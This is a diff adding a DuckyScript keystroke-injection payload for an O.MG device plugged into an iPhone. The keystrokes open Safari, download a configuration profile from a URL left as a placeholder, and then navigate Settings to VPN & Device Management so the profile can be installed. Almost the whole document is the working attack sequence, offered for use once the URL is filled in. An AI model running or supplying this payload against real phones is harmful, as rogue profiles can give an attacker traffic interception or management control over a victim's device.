@@ -1,0 +1,32 @@
+REM Simple-iOS-Profile-Downloader
+REM Version 1.0
+REM OS: iOS
+REM Author: Peaakss
+REM Description: This payload goes out to a URL (Hopefully where there is a IOS profile prompt) and downloads the profile. Then navigates to VPN & Device Management where the profile can be fully installed by the user | Some timing on this payload may have to be changed depending on the device and its version. This payload was tested on iOS 16.1 but should work most newer versions of iOS | In order to use a O.MG device on a iPhone you must have a Lighting to USB-A camera adapter | (Make sure to specify the URL within payload before use)
+
+GUI h
+GUI SPACE
+DELAY 100
+STRING Safari
+DELAY 250
+ENTER
+GUI l
+DELAY 100
+STRING "PROFILE URL"
+ENTER
+DELAY 250
+GUI h
+DELAY 100
+GUI SPACE 
+DELAY 250
+BACKSPACE
+DELAY 100
+STRING Settings
+DELAY 100
+ENTER
+DELAY 250
+TAB 
+STRING VPN & Device Management
+DELAY 100 
+ENTER
+DELAY 200
